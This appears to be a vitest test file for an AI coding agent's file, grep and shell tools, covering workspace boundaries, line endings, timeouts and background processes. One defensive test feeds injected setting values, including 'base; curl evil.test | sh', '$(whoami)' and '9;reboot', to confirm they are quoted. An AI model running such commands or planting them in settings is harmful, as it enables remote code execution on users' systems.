import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import { commandTimeoutMs } from "../toolset/tools";
import { BashTool, wrapCommandForShuru } from "./bash";
import { deleteFile, editFile, readFile, writeFile } from "./file";
import { executeGrep } from "./grep";

/*
 * Fixes from the 2026-10-07 review of the tool layer. Each test is a probe that failed before the change.
 */
const dirs: string[] = [];
function project(): string {
  const dir = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "shelra-review-")));
  dirs.push(dir);
  return dir;
}
afterEach(() => {
  for (const dir of dirs.splice(0)) fs.rmSync(dir, { recursive: true, force: true });
});

describe("file tools after a cd into a subfolder", () => {
  it("read paths against the shell's folder but keep the project as the boundary", async () => {
    const root = project();
    fs.mkdirSync(path.join(root, "sub"));
    fs.writeFileSync(path.join(root, "top.txt"), "from the root\n");
    fs.writeFileSync(path.join(root, "sub", "inner.txt"), "inner\n");
    const view = { root, base: path.join(root, "sub") };

    expect(readFile("../top.txt", view).output).toContain("from the root");
    expect(readFile("inner.txt", view).output).toContain("inner");
    // The absolute path of a project file works from anywhere inside the project.
    expect(readFile(path.join(root, "top.txt"), view).success).toBe(true);
    // Leaving the project is still refused.
    expect(readFile("../../outside.txt", view)).toMatchObject({ success: false });
    expect(readFile("../../outside.txt", view).output).toContain("outside the workspace");

    const written = await writeFile("../made.txt", "ok\n", view);
    expect(written.success).toBe(true);
    expect(fs.existsSync(path.join(root, "made.txt"))).toBe(true);
    expect((await editFile("../made.txt", "ok", "fine", view)).success).toBe(true);
    expect((await deleteFile("../made.txt", view)).success).toBe(true);
  });
});

describe("grep", () => {
  it("says a pattern it cannot read is an error, not an empty result", async () => {
    const root = project();
    fs.writeFileSync(path.join(root, "a.ts"), "foo(1)\n");
    const bad = await executeGrep({ pattern: "foo(" }, root);
    expect(bad.success).toBe(false);
    expect(bad.error).toContain("could not run this pattern");
    const lookahead = await executeGrep({ pattern: "foo(?=1)" }, root);
    expect(lookahead.success).toBe(false);
    const fine = await executeGrep({ pattern: "foo\\(" }, root);
    expect(fine.success).toBe(true);
    expect(fine.output).toContain("a.ts");
    const none = await executeGrep({ pattern: "absent-word" }, root);
    expect(none).toMatchObject({ success: true, output: "No matches found." });
  });

  it("says a path that does not exist is missing instead of searching elsewhere", async () => {
    const root = project();
    const result = await executeGrep({ pattern: "x", path: "nope/dir" }, root);
    expect(result).toMatchObject({ success: false });
    expect(result.error).toContain("Path not found");
  });

  it("does not search outside the project, where Shelra's own keys live", async () => {
    const root = project();
    const outside = project();
    fs.writeFileSync(path.join(outside, "auth.json"), '{"apiKey":"secret"}');
    const result = await executeGrep({ pattern: "secret", path: outside }, root);
    expect(result.success).toBe(false);
    expect(result.error).toContain("outside the workspace");
  });
});

describe("line endings and the byte-order mark", () => {
  it("writes a multi-line replacement into a CRLF file with CRLF lines", async () => {
    const root = project();
    const file = path.join(root, "crlf.txt");
    fs.writeFileSync(file, "line1\r\nline2\r\nline3\r\n");
    const result = await editFile("crlf.txt", "line2", "new2\nextra", root);
    expect(result.success).toBe(true);
    expect(fs.readFileSync(file, "utf-8")).toBe("line1\r\nnew2\r\nextra\r\nline3\r\n");
  });

  it("keeps a file's CRLF endings and byte-order mark when it is rewritten whole", async () => {
    const root = project();
    const file = path.join(root, "doc.txt");
    fs.writeFileSync(file, "﻿one\r\ntwo\r\n");
    await writeFile("doc.txt", "one\ntwo\nthree\n", root);
    expect(fs.readFileSync(file, "utf-8")).toBe("﻿one\r\ntwo\r\nthree\r\n");
  });

  it("writes a new file exactly as given", async () => {
    const root = project();
    await writeFile("new.txt", "a\nb\n", root);
    expect(fs.readFileSync(path.join(root, "new.txt"), "utf-8")).toBe("a\nb\n");
  });

  it("shows CRLF files without a stray carriage return and BOM files without the mark", () => {
    const root = project();
    fs.writeFileSync(path.join(root, "a.txt"), "﻿first\r\nsecond\r\n");
    const out = readFile("a.txt", root).output;
    expect(out).toContain("1 | first\n2 | second");
    expect(out).not.toContain("\r");
    expect(out).not.toContain("﻿");
  });
});

describe("writes", () => {
  it("leave no temporary file behind", async () => {
    const root = project();
    await writeFile("a.txt", "one\n", root);
    await writeFile("a.txt", "two\n", root);
    await editFile("a.txt", "two", "three", root);
    expect(fs.readdirSync(root)).toEqual(["a.txt"]);
    expect(fs.readFileSync(path.join(root, "a.txt"), "utf-8")).toBe("three\n");
  });

  it.runIf(process.platform === "win32")(
    "refuse a Windows device name instead of reporting a file that was not made",
    async () => {
      const root = project();
      const result = await writeFile("nul", "x", root);
      expect(result.success).toBe(false);
      expect(result.output).toContain("reserved Windows device name");
    },
  );
});

describe("read_file", () => {
  it("says a folder is a folder", () => {
    const root = project();
    fs.mkdirSync(path.join(root, "dir"));
    const result = readFile("dir", root);
    expect(result.success).toBe(false);
    expect(result.output).toContain("is a folder");
  });
});

describe("command timeouts", () => {
  it("are capped, so a very long value does not fire at once", () => {
    expect(commandTimeoutMs(3_000_000_000)).toBe(2 * 60 * 60 * 1_000);
    expect(commandTimeoutMs(30)).toBe(30_000);
    expect(commandTimeoutMs(45_000)).toBe(45_000);
    expect(commandTimeoutMs(undefined)).toBeUndefined();
  });
});

describe("cd inside the project", () => {
  it("allows a folder whose name starts with two dots, and still refuses the way out", async () => {
    const root = project();
    fs.mkdirSync(path.join(root, "..hidden"));
    const bash = new BashTool(root);
    expect((await bash.execute("cd ..hidden")).success).toBe(true);
    expect(bash.getCwd()).toBe(path.join(root, "..hidden"));
    const out = await bash.execute("cd ../..");
    expect(out.success).toBe(false);
    expect(out.error).toContain("outside the workspace root");
  });
});

describe("the sandbox command line built from settings", () => {
  it("quotes every value, so a project setting cannot add a command to the host line", () => {
    const line = wrapCommandForShuru("/repo", "echo hi", {
      from: "base; curl evil.test | sh",
      allowedHosts: ["ok.example.com", "x$(whoami).test"],
      ports: ["8080:80", "9;reboot"],
      cpus: 2,
    });
    expect(line).toContain("--from 'base; curl evil.test | sh'");
    expect(line).toContain("--allow-host ok.example.com");
    expect(line).toContain("--allow-host 'x$(whoami).test'");
    expect(line).toContain("-p 8080:80");
    expect(line).toContain("-p '9;reboot'");
    expect(line).toContain("--cpus 2");
  });
});

describe("background processes", () => {
  it("say when a stop did not stop them", async () => {
    const bash = new BashTool(project());
    const started = await bash.startBackground(process.platform === "win32" ? "Start-Sleep -Seconds 60" : "sleep 60");
    const id = started.backgroundProcess?.id ?? -1;
    const stopped = await bash.stopProcess(id);
    expect(stopped.success).toBe(true);
    expect(stopped.output).toContain("stopped");
    await bash.cleanup();
  });

  it.runIf(process.platform === "win32")("do not leave PowerShell's raw error stream in their log", async () => {
    const bash = new BashTool(project());
    const started = await bash.startBackground("nonexistent-program-xyz");
    const id = started.backgroundProcess?.id ?? -1;
    await new Promise((resolve) => setTimeout(resolve, 2_500));
    const logs = await bash.getProcessLogs(id);
    expect(logs.output).not.toContain("CLIXML");
    expect(logs.output).not.toContain("<Objs");
    await bash.cleanup();
  });
});

describe.runIf(process.platform === "win32")("PowerShell output", () => {
  it("keeps accents and symbols", async () => {
    const bash = new BashTool(project());
    const result = await bash.execute('Write-Output "é ñ ü ✓"');
    expect(result.output).toContain("é ñ ü ✓");
  });
});
